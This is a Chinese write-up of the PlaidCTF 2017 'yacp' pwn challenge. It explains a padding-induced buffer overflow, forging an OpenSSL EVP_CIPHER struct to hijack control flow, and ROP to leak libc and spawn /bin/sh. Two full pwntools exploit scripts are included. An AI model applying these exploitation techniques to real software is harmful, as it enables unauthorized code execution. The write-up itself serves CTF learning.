# Pctf2017 yacp

根据题目藐视，这是一道和密码学有关的 pwn 题。ida 反编译的时候发现了许多 openssl 的函数，但是 ida 默认并没有 openssl 的知识，openssl 库的数据类型和函数原型信息都没有。所以我们要做的第一步是给 ida 扩充知识库。

## 生成 openssl 库的 til 文件

ida 所有的数据类型和函数原型信息都存储在 til 文件当中，一般情况下 ida 会根据二进制文件的类型自动寻找并且加载相应的 til 文件，但有的时候会需要我们手动去加载 til 文件。首先我们要用tilib 这个工具生成新的 til 文件。

在网上找到了tilib68这个工具包，里面包含了 linux、Mac、Windows 三个版本的 tilib可执行文件，32位和64位都有，32位用于 ida，64位用于 ida64.

凑巧在 github 上找到了一个为 openssl 生成 til 文件的工具，[github 链接](https://github.com/Rupan/ida/tree/master/openssl)。我把这个工具放在了自己的 CTF 工具箱里面。

这是它的脚本文件（加以修改后的）

```shell
#!/bin/bash

#IDA="/Applications/IDA\ Pro\ 6.9/idabin"
IDA="/Applications/IDA Pro 6.9/idabin"
if [ ! -d "$IDA" ]
then
  echo "Edit the IDA path in this script."
  exit 1
fi

rm -f openssl_102h_gcc_x86.til openssl_102h_gcc_x64.til

### x86
rm -f openssl_all.i
"${IDA}"/tilib -Gn -v -z -c -I. -Iempty -I"/usr/local/Cellar/openssl/1.0.2k/include/" -b"${IDA}"/til/gnucmn.til \
	-hopenssl_all.h -t'OpenSSL 1.0.2k (gcc/x86)' openssl_102k_gcc_x86.til


### x64
rm -f openssl_all.i

"${IDA}"/tilib64 -Gn -v -z -c @gcc64.cfg -I. -Iempty -I"/usr/local/Cellar/openssl/1.0.2k/include/" -b"${IDA}"/til/gnucmn.til -Moutput_mac_x64\
	-hopenssl_all.h -t'OpenSSL 1.0.2k (gcc/x64)' openssl_102k_gcc_x64.til

#If you need to craete macro enums, modify the output_mac_x64 file and uncomment the following lines. For more information, please read the README of tilib

#"${IDA}"/tilib64 -Gn -v -z -c @gcc64.cfg -I. -Iempty -I"/usr/local/Cellar/openssl/1.0.2k/include/" -b"${IDA}"/til/gnucmn.til -moutput_mac_x64\
#	-hopenssl_all.h -t'OpenSSL 1.0.2k (gcc/x64)' openssl_102k_gcc_x64.til
rm -f openssl_all.i

```

其中各个选项的意思可以参考 tilib 的 README 文档。生成 til 文件后把这个文件放到 ida 目录的 til 文件夹下就可以了，然后导入就可以了。因为我用的tilib是6.8版的，所以也只能给6.8版本的 ida pro 使用。放在6.9版本的 ida pro的 til 文件夹下，然后在 ida 程序里可以导入的库中并没有找到自己的 til 文件。所以应该是兼容问题。

## 找漏洞

由于 DES 或 AES 等加密算法的特性，即使你明文长度是 block size 的整数倍，最后还是要多出一个 padding block。所以如果明文是2048字节， 那么密文就会比明文长8字节（DES）或长16个字节（AES），而缓冲区的大小最大只有2048个字节，造成了溢出。可以覆盖掉后面的buffer_size_arr数组，把 buffer 的 size 改写为任意值。然后再加密的时候就可以覆盖之后的evp_cipher_ctx这个结构体了，这个结构体存储的一些信息被篡改可以控制 eip，接下来就要去分析 openssl 的源代码了。

```assembly
.bss:0804C0E0 ; unsigned __int8 bufs_arr[32][2048]
.bss:0804C0E0 bufs_arr        db 10000h dup(?)        
.bss:0804C0E0                                         
.bss:0805C0E0 ; int buffer_size_arr[]
.bss:0805C0E0 buffer_size_arr dd 20h dup(?)           
.bss:0805C0E0                                         
.bss:0805C160 ; EVP_MD_CTX evp_md_ctx
.bss:0805C160 evp_md_ctx      EVP_MD_CTX <?>          
.bss:0805C160                                         
.bss:0805C178 ; EVP_CIPHER_CTX evp_cipher_ctx
.bss:0805C178 evp_cipher_ctx  EVP_CIPHER_CTX <?>      
.bss:0805C178                                         
.bss:0805C204 ; const EVP_MD *evp_digest
.bss:0805C204 evp_digest      dd ?                    
.bss:0805C204                                         
.bss:0805C208 ; const EVP_CIPHER *evp_cipher
.bss:0805C208 evp_cipher      dd ?                    
.bss:0805C208                                         
.bss:0805C208 _bss            ends
.bss:0805C208
```



## openssl 源码分析

为此我还专门用woboq的 codebrowser 搭建了一个在线源码阅读的网站。网址：http://118.89.185.138/woboq/



首先观察一下evp_cipher_st这个结构体

```C

449	struct evp_cipher_ctx_st {
450	    const EVP_CIPHER *cipher;
451	    ENGINE *engine;             /* functional reference if 'cipher' is
452	                                 * ENGINE-provided */
453	    int encrypt;                /* encrypt or decrypt */
454	    int buf_len;                /* number we have left */
455	    unsigned char oiv[EVP_MAX_IV_LENGTH]; /* original iv */
456	    unsigned char iv[EVP_MAX_IV_LENGTH]; /* working iv */
457	    unsigned char buf[EVP_MAX_BLOCK_LENGTH]; /* saved partial block */
458	    int num;                    /* used by cfb/ofb/ctr mode */
459	    void *app_data;             /* application stuff */
460	    int key_len;                /* May change for variable length cipher */
461	    unsigned long flags;        /* Various flags */
462	    void *cipher_data;          /* per EVP data */
463	    int final_used;
464	    int block_mask;
465	    unsigned char final[EVP_MAX_BLOCK_LENGTH]; /* possible final block */
466	} /* EVP_CIPHER_CTX */ ;


```

这个函数存储了很多和加密相关的信息，最重要的是第一个指针 ciphper，这个指针又指向另一个结构体EVP_CIPHER, 内部名字叫evp_cipher_st。

```C
struct evp_cipher_st {
309	    int nid;
310	    int block_size;
311	    /* Default value for variable length ciphers */
312	    int key_len;
313	    int iv_len;
314	    /* Various flags */
315	    unsigned long flags;
316	    /* init key */
317	    int (*init) (EVP_CIPHER_CTX *ctx, const unsigned char *key,
318	                 const unsigned char *iv, int enc);
319	    /* encrypt/decrypt data */
320	    int (*do_cipher) (EVP_CIPHER_CTX *ctx, unsigned char *out,
321	                      const unsigned char *in, size_t inl);
322	    /* cleanup ctx */
323	    int (*cleanup) (EVP_CIPHER_CTX *);
324	    /* how big ctx->cipher_data needs to be */
325	    int ctx_size;
326	    /* Populate a ASN1_TYPE with parameters */
327	    int (*set_asn1_parameters) (EVP_CIPHER_CTX *, ASN1_TYPE *);
328	    /* Get parameters from a ASN1_TYPE */
329	    int (*get_asn1_parameters) (EVP_CIPHER_CTX *, ASN1_TYPE *);
330	    /* Miscellaneous operations */
331	    int (*ctrl) (EVP_CIPHER_CTX *, int type, int arg, void *ptr);
332	    /* Application data */
333	    void *app_data;
334	} /* EVP_CIPHER */ ;

```

这个结构体中有很多函数指针， do_cipher 这个函数指针是用来具体执行加解密过程的。

我们可以在EVP_CipherUpdate这个函数中把evp_cipher_ctx中的 cipher 指针指向自己控制的 buffer，在 buffer 中伪造一个假的EVP_CIPHER结构体，结构体中的do_cipher指针篡改成自己想跳转到的任意地址。在EVP_EncryptFinal_ex这个函数中会去调用do_cipher

```C
388	int EVP_EncryptFinal_ex(EVP_CIPHER_CTX *ctx, unsigned char *out, int *outl)
389	{
390	    int n, ret;
391	    unsigned int i, b, bl;
392	
393	    if (ctx->cipher->flags & EVP_CIPH_FLAG_CUSTOM_CIPHER) {
394	        ret = M_do_cipher(ctx, out, NULL, 0);
395	        if (ret < 0)
396	            return 0;
397	        else
398	            *outl = ret;
399	        return 1;
400	    }
...
...

```

M_do_cipher就是do_cipher，但是注意在构造EVP_CIPHER结构体的时候满足EVP_CIPH_FLAG_CUSTOM_CIPHER这个 flag 位置位。

## 编写 EXP

最后的思路是先覆盖 buffer_size_arr这个数组，把 size 覆盖成一个合适的值，不能太大或太小，太大的话加密的时候会写到段的边界外，直接段错误掉，太小的话就覆盖不到evp_cipher_ctx。 然后在 buffer 0伪造一个evp_cipher结构体，然后encrypt覆盖掉evp_cipher_ctx的第一个指针，指向那个伪造的结构体，再之后就可以 rop 了，思路清楚之后就可以开始写 EXP 了。

最后思考怎么rop 的时候发现ebp正好指向了 bss 段中的一个 buffer 的起始地址，那么就可以在那里布置 rop chain，但这时候还得先 leak libc，leak 完之后调用 scanf 函数在 rop chain 后面添上system 函数的地址和"/bin/sh"字符串的地址，就可以了。

还有一种思路是 rop 的时候先 leak libc，leak 完了跳转到程序的start函数，再来一次同样的 attack，第二次直接 rop 到 system 函数就可以了。但是这种思路有个坑点，就是栈被迁移到 bss 段去了，所以要小心栈的内容不要和 bss 段上的内容重叠，好在 bss 段蛮大的，所以没有什么问题，稍微修改一下代码就行了。

第一种 rop 思路的 exp 如下

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
""" dddong / AAA """

from pwn import *
import sys, os, re
from binascii import hexlify, unhexlify
from Crypto.Cipher import AES

context(arch='i386', os='linux', log_level='debug')
context(terminal=['gnome-terminal', '-x', 'bash', '-c'])

def __get_base(p, _path):
    _vmmap = open('/proc/%d/maps' % p.proc.pid).read()
    _regex = '^.* r-xp .* {}$'.format(_path)
    _line = [_ for _ in _vmmap.split('\n') if re.match(_regex, _)][0]
    return int(_line.split('-')[0], 16)

def gen_rop(func_addr, args):
    """
    automate generate rop function
    _gadgets array contains gadgets address for 0,1,2,... args
    """
    _gadgets = []
    rop = ""
    rop += p32(func_addr)
    if len(args) > 1:
        rop += _gadgets[len(args)]
        for arg in args:
            rop += p32(args)
    return rop


_program = 'yacp'
_pwn_remote = 0
_debug = int(sys.argv[1]) if len(sys.argv) > 1 else 0

elf = ELF('./' + _program)

if _pwn_remote == 0:
    os.environ['LD_PRELOAD'] = ''
    libc = ELF('./libc.so.6')
    p = process(['./' + _program, "first_argv"])

    if _debug != 0:
        if elf.pie:
            _bps = [0x80493ff] #breakpoints defined by yourself, not absolute addr, but offset addr of the program's base addr
            _offset = __get_base(p, os.path.abspath(p.executable))
            _source = '\n'.join(['b*%d' % (_offset + _) for _ in _bps])
        else:
            _source = 'source peda-session-%s.txt' % _program
        gdb.attach(p.proc.pid, execute=_source)
else:
    libc = ELF('./libc6-i386_2.19-0ubuntu6.9_amd64.so') #todo
    p = remote('8.8.8.8', 4002)	#todo

def load_data(size, buf_idx, hexbytes):
    p.sendline("0")
    p.sendlineafter("How many bytes is the data?", str(size))
    p.sendlineafter("Which buffer (0-31) would you like to use?", str(buf_idx))
    p.sendlineafter("hex-encoded bytes", hexbytes)

def gen_random_data(size, in_buf):
    p.sendline("1")
    p.sendlineafter("want?", str(size))
    p.sendlineafter("use?", str(in_buf))

def decrypt_data(cipher_type, input_buf, output_buf, key_buf, iv_buf):
    p.sendline("4")
    p.sendlineafter("perform?", cipher_type)
    try:
        p.sendlineafter("use?", str(input_buf))
    except EOFError:
        print("unknown cipher format.Goodbye!")
        sys.exit(1)
    p.sendlineafter("use?", str(output_buf))
    p.sendlineafter("use?", str(key_buf))
    p.sendlineafter("use?", str(iv_buf))

def encrypt_data(cipher_type, input_buf, output_buf, key_buf, iv_buf):
    p.sendline("3")
    p.sendlineafter("perform?", cipher_type)
    try:
        p.sendlineafter("use?", str(input_buf))
    except EOFError:
        print("unknown cipher format.Goodbye!")
        sys.exit(1)
    p.sendlineafter("use?", str(output_buf))
    p.sendlineafter("use?", str(key_buf))
    p.sendlineafter("use?\n", str(iv_buf))

def hash_data(hash_type, in_buf, out_buf):
    p.sendlineafter("Display data", "2")
    p.sendlineafter("perform?", hash_type)
    p.sendlineafter("use?", str(in_buf))
    p.sendlineafter("use?", str(out_buf))

def display_data(buf_idx):
    p.sendlineafter("Display data", "5")
    p.sendlineafter("use?\n", str(buf_idx))
    data = p.recvrepeat(timeout=0.1)
    #print "data:", data
    match = re.search(r'buffer\[\d+\] \((\d+) bytes\) = (\w*)', data)
    if match:
        content_size = match.group(1)
        content = match.group(2)
        print "buffer %d: size: %s, content:%s" % (buf_idx, content_size, content)
        return content_size, content
    else:
        return None, None

def get_buf_addr(idx):
    return bufs_arr_addr + 0x800 * idx


bufs_arr_addr = 0x0804C0E0
evp_cipher = 0x805c208
evp_digest = 0x805c204
evp_cipher_ctx = 0x0805C178
#################################       exp    ######################################
low_bound = evp_cipher - get_buf_addr(31)
up_bound = evp_cipher - get_buf_addr(17)

"""下面这一段代码是用来寻找合适的 key，来保证第一次溢出覆盖 buffer_size的时候最后的 size 不会太大或者太小
for key in xrange(0, 2 ** 32):
    key = pack(key, 128)
    cipher = AES.new(key, AES.MODE_ECB, '\x00' * 16)
    enc = cipher.encrypt('\x10' * 16)[:16]
    #print "enc:", enc
    size_list = re.findall(r'....', enc)
    size_list = [ u32(x) for x in size_list ]
    size_list
    for size in size_list:
        if low_bound <= size <= 4000:
            print "Found one key!!!"
            print "current key:", unpack(key, 128)
            print "proper size:", size
            raw_input("success!please enter to continue")

"""
key = pack(489965, 128)
load_data(16, 4, hexlify(key))
load_data(2048, 0, 'AA' * 2048)
encrypt_data("aes-128-ecb", 0, 31, 4, 1)
size, content = display_data(31)

# buf 0,1,2,3的size 被覆盖了，buffer 2 的 size 是26828
leave_ret = 0x08048c38
fake_evp_cipher_st = [0, 0, 0, 0, 0x100000, 0, leave_ret]
fake_st_addr = 0x0804C0E0
payload = ''.join(p32(x) for x in fake_evp_cipher_st)
load_data(len(payload), 0, hexlify(payload)) #buffer 0 布置好fake evp_cipher_st
off2outbuf = evp_cipher_ctx - get_buf_addr(31) - 8 #2200

#加密buffer 1, buffer 1 的 size 非常大
cipher = AES.new('\x00' * 16, AES.MODE_ECB, '\x00' * 16)
plain = cipher.decrypt('\x00' * 8 + p32(fake_st_addr) + '\x00' * 4)
#print "plain:", len(plain)

################################  leak libc #####################################
ret = 0x8048896
popret = 0x80488ad
pop4ret = 0x8048ee0
pop2ret = 0x8048ee2
pop3ret = 0x8048ee1
addesp_12 = 0x80488aa
addesp_28 = 0x8048d86
addesp_44 = 0x8048d01
addesp_60 = 0x8048edd
addesp_76 = 0x804933a
addesp_156 = 0x804982a
rop_chain = [
        0, #pop ebp in leave
        0x08048960, #puts@plt
        popret,
        elf.got['free'],
        0x08048A30, #scanf@plt
        pop3ret,
        get_buf_addr(28),
        get_buf_addr(30) + 9 * 4,
        get_buf_addr(30) + 11 * 4,
        ]
load_data(5, 28, hexlify("%x:%x"))

rop_str=  ''.join(p32(x) for x in rop_chain)
load_data(len(rop_chain) * 4, 30,  hexlify(rop_str))
load_data(off2outbuf - 2048 + 16, 3, 'AA' * (off2outbuf - 2048) + hexlify(plain))
raw_input("attach")
encrypt_data("aes-128-ecb", input_buf=2, output_buf=31, key_buf=29, iv_buf=30)

libc_free = u32(p.recvn(4))
print "libc_free", hex(libc_free)
libc.address = libc_free - libc.symbols['free']

p.sendline(hex(libc.symbols['system'])+":"+hex(libc.search('/bin/sh').next()))
p.interactive()
```



第二种 rop 思路的 exp 如下

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
""" dddong / AAA """

from pwn import *
import sys, os, re
from binascii import hexlify, unhexlify
from Crypto.Cipher import AES

context(arch='i386', os='linux', log_level='info')
context(terminal=['gnome-terminal', '-x', 'bash', '-c'])

def __get_base(p, _path):
    _vmmap = open('/proc/%d/maps' % p.proc.pid).read()
    _regex = '^.* r-xp .* {}$'.format(_path)
    _line = [_ for _ in _vmmap.split('\n') if re.match(_regex, _)][0]
    return int(_line.split('-')[0], 16)

def gen_rop(func_addr, args):
    """
    automate generate rop function
    _gadgets array contains gadgets address for 0,1,2,... args
    """
    _gadgets = []
    rop = ""
    rop += p32(func_addr)
    if len(args) > 1:
        rop += _gadgets[len(args)]
        for arg in args:
            rop += p32(args)
    return rop


_program = 'yacp'
_pwn_remote = 0
_debug = int(sys.argv[1]) if len(sys.argv) > 1 else 0

elf = ELF('./' + _program)

if _pwn_remote == 0:
    os.environ['LD_PRELOAD'] = ''
    libc = ELF('./libc.so.6')
    p = process(['./' + _program, "first_argv"])

    if _debug != 0:
        if elf.pie:
            _bps = [0x80493ff] #breakpoints defined by yourself, not absolute addr, but offset addr of the program's base addr
            _offset = __get_base(p, os.path.abspath(p.executable))
            _source = '\n'.join(['b*%d' % (_offset + _) for _ in _bps])
        else:
            _source = 'source peda-session-%s.txt' % _program
        gdb.attach(p.proc.pid, execute=_source)
else:
    libc = ELF('./libc6-i386_2.19-0ubuntu6.9_amd64.so') #todo
    p = remote('8.8.8.8', 4002)	#todo

def load_data(size, buf_idx, hexbytes):
    p.sendline("0")
    p.sendlineafter("How many bytes is the data?", str(size))
    p.sendlineafter("Which buffer (0-31) would you like to use?", str(buf_idx))
    p.sendlineafter("hex-encoded bytes", hexbytes)

def gen_random_data(size, in_buf):
    p.sendline("1")
    p.sendlineafter("want?", str(size))
    p.sendlineafter("use?", str(in_buf))

def decrypt_data(cipher_type, input_buf, output_buf, key_buf, iv_buf):
    p.sendline("4")
    p.sendlineafter("perform?", cipher_type)
    try:
        p.sendlineafter("use?", str(input_buf))
    except EOFError:
        print("unknown cipher format.Goodbye!")
        sys.exit(1)
    p.sendlineafter("use?", str(output_buf))
    p.sendlineafter("use?", str(key_buf))
    p.sendlineafter("use?", str(iv_buf))

def encrypt_data(cipher_type, input_buf, output_buf, key_buf, iv_buf):
    p.sendline("3")
    p.sendlineafter("perform?", cipher_type)
    try:
        p.sendlineafter("use?", str(input_buf))
    except EOFError:
        print("unknown cipher format.Goodbye!")
        sys.exit(1)
    p.sendlineafter("use?", str(output_buf))
    p.sendlineafter("use?", str(key_buf))
    p.sendlineafter("use?\n", str(iv_buf))

def hash_data(hash_type, in_buf, out_buf):
    p.sendlineafter("Display data", "2")
    p.sendlineafter("perform?", hash_type)
    p.sendlineafter("use?", str(in_buf))
    p.sendlineafter("use?", str(out_buf))

def display_data(buf_idx):
    p.sendlineafter("Display data", "5")
    p.sendlineafter("use?\n", str(buf_idx))
    data = p.recvrepeat(timeout=0.1)
    #print "data:", data
    match = re.search(r'buffer\[\d+\] \((\d+) bytes\) = (\w*)', data)
    if match:
        content_size = match.group(1)
        content = match.group(2)
        print "buffer %d: size: %s, content:%s" % (buf_idx, content_size, content)
        return content_size, content
    else:
        return None, None

def get_buf_addr(idx):
    return bufs_arr_addr + 0x800 * idx


bufs_arr_addr = 0x0804C0E0
evp_cipher = 0x805c208
evp_digest = 0x805c204
evp_cipher_ctx = 0x0805C178
#################################       exp    ######################################
low_bound = evp_cipher - get_buf_addr(31)
up_bound = evp_cipher - get_buf_addr(17)

"""
for key in xrange(0, 2 ** 32):
    key = pack(key, 128)
    cipher = AES.new(key, AES.MODE_ECB, '\x00' * 16)
    enc = cipher.encrypt('\x10' * 16)[:16]
    #print "enc:", enc
    size_list = re.findall(r'....', enc)
    size_list = [ u32(x) for x in size_list ]
    size_list
    for size in size_list:
        if low_bound <= size <= 4000:
            print "Found one key!!!"
            print "current key:", unpack(key, 128)
            print "proper size:", size
            raw_input("success!please enter to continue")

"""
ret = 0x8048896
popret = 0x80488ad
pop4ret = 0x8048ee0
pop2ret = 0x8048ee2
pop3ret = 0x8048ee1
addesp_12 = 0x80488aa
addesp_28 = 0x8048d86
addesp_44 = 0x8048d01
addesp_60 = 0x8048edd
addesp_76 = 0x804933a
addesp_156 = 0x804982a

key = pack(489965, 128)
load_data(16, 4, hexlify(key))
load_data(2048, 0, 'AA' * 2048)
encrypt_data("aes-128-ecb", 0, 31, 4, 1)
size, content = display_data(31)

# buf 0,1,2,3的size 被覆盖了，buffer 2 的 size 是26828
leave_ret = 0x08048c38
fake_evp_cipher_st = [0, 0, 0, 0, 0x100000, 0, leave_ret]
fake_st_addr = 0x0804C0E0
payload = ''.join(p32(x) for x in fake_evp_cipher_st)
load_data(len(payload), 0, hexlify(payload)) #buffer 0 布置好fake evp_cipher_st
off2outbuf = evp_cipher_ctx - get_buf_addr(31) - 8 #2200

#加密buffer 1, buffer 1 的 size 非常大
cipher = AES.new('\x00' * 16, AES.MODE_ECB, '\x00' * 16)
plain = cipher.decrypt('\x00' * 8 + p32(fake_st_addr) + '\x00' * 4)
#print "plain:", len(plain)

################################  leak libc #####################################
rop_chain = [
        0, #pop ebp in leave
        0x08048960, #puts@plt
        0x08048BD2, #start
        elf.got['free'],
        ]
load_data(5, 28, hexlify("%x:%x"))

rop_str=  ''.join(p32(x) for x in rop_chain)
load_data(len(rop_chain) * 4, 30,  hexlify(rop_str))
load_data(off2outbuf - 2048 + 16, 3, 'AA' * (off2outbuf - 2048) + hexlify(plain))
#raw_input("attach")
encrypt_data("aes-128-ecb", input_buf=2, output_buf=31, key_buf=29, iv_buf=30)

libc_free = u32(p.recvn(4))
print "libc_free", hex(libc_free)
libc.address = libc_free - libc.symbols['free']

################################ getshell ##################################

key = pack(489965, 128)
load_data(16, 4, hexlify(key))
load_data(2048, 0, 'AA' * 2048)
encrypt_data("aes-128-ecb", 0, 31, 4, 1)
size, content = display_data(31)

# buf 0,1,2,3的size 被覆盖了，buffer 2 的 size 是26828
leave_ret = 0x08048c38
fake_evp_cipher_st = [0, 0, 0, 0, 0x100000, 0, leave_ret]
fake_st_addr = 0x0804C0E0
payload = ''.join(p32(x) for x in fake_evp_cipher_st)
load_data(len(payload), 0, hexlify(payload)) #buffer 0 布置好fake evp_cipher_st
off2outbuf = evp_cipher_ctx - get_buf_addr(31) - 8 #2200


rop_chain = [
        0, #pop ebp in leave
        libc.symbols['system'], #puts@plt
        0x08048BD2, #start
        libc.search('/bin/sh').next(),
        ]

#加密buffer 1, buffer 1 的 size 非常大
the_key = ''.join(p32(x) for x in rop_chain)
cipher = AES.new(the_key, AES.MODE_ECB, '\x00' * 16)
plain = cipher.decrypt('\x00' * 8 + p32(fake_st_addr) + '\x00' * 4)

rop_str=  ''.join(p32(x) for x in rop_chain)
load_data(len(rop_chain) * 4, 18,  hexlify(rop_str))
load_data(off2outbuf - 2048 + 16, 3, 'AA' * (off2outbuf - 2048) + hexlify(plain))
raw_input("attach")
encrypt_data("aes-128-ecb", input_buf=2, output_buf=31, key_buf=18, iv_buf=18)
p.interactive()
```



## 错误的思路

先通过 encrypt 覆盖 size 字段，覆盖成一个合适的值。

然后 encrypt 覆盖`.bss:0805C204 ; const EVP_MD *evp_digest`，改成 bss 上的一个地址，在那个地址伪造一个EVP_MD结构体， 把 init 字段改成 system 或其他（尝试 magic 或者 rop chain，rop chain 布置在 bss 段）

然后调用 Hash_data函数，触发漏洞。



这个思路不可行，因为覆盖evp_digest之前肯定已经覆盖掉了evp_cipher_ctx结构体的内容，在调用加密函数的时候会直接崩掉。

还有程序开始时候的enter_magic_word的函数根本和题目无关，是 pctf 比赛时候要连上这个程序需要暴力破解出 magic word 通过验证（不知道为什么我爆破了很久没有破解出，代码写错了？

## 玄学

遇到了一个很奇怪的问题，load_data的时候设定 size 为2048，在命令行发送4096个字节过去，甚至是10000个字节过去，都没有反应，必须还要再输入2、3个字节。